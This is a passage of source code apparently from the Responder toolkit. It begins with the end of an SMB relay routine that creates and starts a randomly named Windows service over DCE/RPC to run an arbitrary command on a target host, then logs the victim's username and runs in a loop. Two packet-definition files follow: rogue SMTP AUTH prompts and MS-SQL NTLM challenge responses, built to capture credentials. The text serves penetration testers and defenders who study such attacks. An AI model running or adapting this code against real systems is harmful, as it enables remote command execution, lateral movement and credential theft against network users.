                      ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
                      ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
                      FileChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.bat'
                      w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,ReferentID="\x21\x03\x03\x00",BinCMD=CMD)
                      w.calculate()
                      x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
                      x.calculate()
                      t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                      t.calculate()
                      packet0 = str(head)+str(t)
                      buffer1 = longueur(packet0)+packet0  
                      s.send(buffer1)
                      data = s.recv(2048)
                      ## DCE/RPC Read Answer.
                      if data[8:10] == "\x2f\x00":
                         head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                         t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                         t.calculate()
                         packet0 = str(head)+str(t)
                         buffer1 = longueur(packet0)+packet0  
                         s.send(buffer1)
                         data = s.recv(2048)
                         ## DCE/RPC SVCCTLOpenService.
                         if data[8:10] == "\x2e\x00":
                            if data[len(data)-4:] == "\x05\x00\x00\x00":
                               print "[+] Failed to create the service"

                            head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                            w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
                            w.calculate()
                            x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
                            x.calculate()
                            t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                            t.calculate()
                            packet0 = str(head)+str(t)
                            buffer1 = longueur(packet0)+packet0  
                            s.send(buffer1)
                            data = s.recv(2048)
                            ## DCE/RPC Read Answer.
                            if data[8:10] == "\x2f\x00":
                               head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                               t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                               t.calculate()
                               packet0 = str(head)+str(t)
                               buffer1 = longueur(packet0)+packet0  
                               s.send(buffer1)
                               data = s.recv(2048)
                               ## DCE/RPC SVCCTLStartService.
                               if data[8:10] == "\x2e\x00":
                                  if data[len(data)-4:] == "\x05\x00\x00\x00":
                                     print "[+] Failed to open the service"
                                  ContextHandler = data[88:108]
                                  head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                  w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
                                  x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
                                  x.calculate()
                                  t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                                  t.calculate()
                                  packet0 = str(head)+str(t)
                                  buffer1 = longueur(packet0)+packet0  
                                  s.send(buffer1)
                                  data = s.recv(2048)
                                  ## DCE/RPC Read Answer.
                                  if data[8:10] == "\x2f\x00":
                                     head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                     t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                                     t.calculate()
                                     packet0 = str(head)+str(t)
                                     buffer1 = longueur(packet0)+packet0  
                                     s.send(buffer1)
                                     data = s.recv(2048)
                                     if data[8:10] == "\x2e\x00":
                                        print "[+] Command successful !"
                                        Logs.info('Command successful:')
                                        Logs.info(Target+","+Username+','+CMD)
                                        return True
                                     if data[8:10] != "\x2e\x00":
                                        return False


def RunInloop(Target,Command,Domain):
   try:
      while True:
         worker = RunRelay(Target,Command,Domain)
   except:
      raise


def main():
   try:
      thread.start_new(RunInloop,(Target,Command,Domain))
   except KeyboardInterrupt:
      exit()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        raise
    raw_input()


########NEW FILE########
__FILENAME__ = SMTPPackets
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#SMTP Greating class
class SMTPGreating(Packet):
    fields = OrderedDict([
        ("Code",             "220"),
        ("Separator",        "\x20"), 
        ("Message",          "smtp01.local ESMTP"),
        ("CRLF",             "\x0d\x0a"),
        ]) 

class SMTPAUTH(Packet):
    fields = OrderedDict([
        ("Code0",            "250"),
        ("Separator0",       "\x2d"), 
        ("Message0",         "smtp01.local"),
        ("CRLF0",            "\x0d\x0a"),
        ("Code",             "250"),
        ("Separator",        "\x20"), 
        ("Message",          "AUTH LOGIN PLAIN XYMCOOKIE"),
        ("CRLF",             "\x0d\x0a"),
        ]) 

class SMTPAUTH1(Packet):
    fields = OrderedDict([
        ("Code",             "334"),
        ("Separator",        "\x20"), 
        ("Message",          "VXNlcm5hbWU6"),#Username
        ("CRLF",             "\x0d\x0a"),

        ]) 

class SMTPAUTH2(Packet):
    fields = OrderedDict([
        ("Code",             "334"),
        ("Separator",        "\x20"), 
        ("Message",          "UGFzc3dvcmQ6"),#Password
        ("CRLF",             "\x0d\x0a"),

        ]) 



########NEW FILE########
__FILENAME__ = SQLPackets
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#MS-SQL Pre-login packet class
class MSSQLPreLoginAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"),
        ("Status",           "\x01"), 
        ("Len",              "\x00\x25"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\x00"),
        ("VersionOffset",    "\x00\x15"),
        ("VersionLen",       "\x00\x06"),
        ("TokenType1",       "\x01"),
        ("EncryptionOffset", "\x00\x1b"),
        ("EncryptionLen",    "\x00\x01"),
        ("TokenType2",       "\x02"),
        ("InstOptOffset",    "\x00\x1c"),
        ("InstOptLen",       "\x00\x01"),
        ("TokenTypeThrdID",  "\x03"),
        ("ThrdIDOffset",     "\x00\x1d"),
        ("ThrdIDLen",        "\x00\x00"),
        ("ThrdIDTerminator", "\xff"),
        ("VersionStr",       "\x09\x00\x0f\xc3"),
        ("SubBuild",         "\x00\x00"),
        ("EncryptionStr",    "\x02"),
        ("InstOptStr",       "\x00"),
        ]) 

    def calculate(self):
        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])+str(self.fields["EncryptionStr"])+str(self.fields["InstOptStr"])

        VersionOffset = str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])

        EncryptionOffset = VersionOffset+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])

        InstOpOffset = EncryptionOffset+str(self.fields["EncryptionStr"])
         
        ThrdIDOffset = InstOpOffset+str(self.fields["InstOptStr"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        #Version
        self.fields["VersionLen"] = struct.pack(">h",len(self.fields["VersionStr"]+self.fields["SubBuild"]))
        self.fields["VersionOffset"] = struct.pack(">h",len(VersionOffset))
        #Encryption
        self.fields["EncryptionLen"] = struct.pack(">h",len(self.fields["EncryptionStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(EncryptionOffset))
        #InstOpt
        self.fields["InstOptLen"] = struct.pack(">h",len(self.fields["InstOptStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(InstOpOffset))
        #ThrdIDOffset
        self.fields["ThrdIDOffset"] = struct.pack(">h",len(ThrdIDOffset))

#MS-SQL NTLM Negotiate packet class
class MSSQLNTLMChallengeAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"), 
        ("Status",           "\x01"),
        ("Len",              "\x00\xc7"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\xed"),
        ("SSPIBuffLen",      "\xbc\x00"),
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),
        ]) 

    def calculate(self):
        ##First convert to uni
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
        ##Then calculate

        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["SSPIBuffLen"])+str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        CalculateSSPI = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])

        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])

        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        self.fields["SSPIBuffLen"] = struct.pack("<i",len(CalculateSSPI))[:2]
        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        #AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        #AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]
        #AvPairs 6 len is always 00.

########NEW FILE########
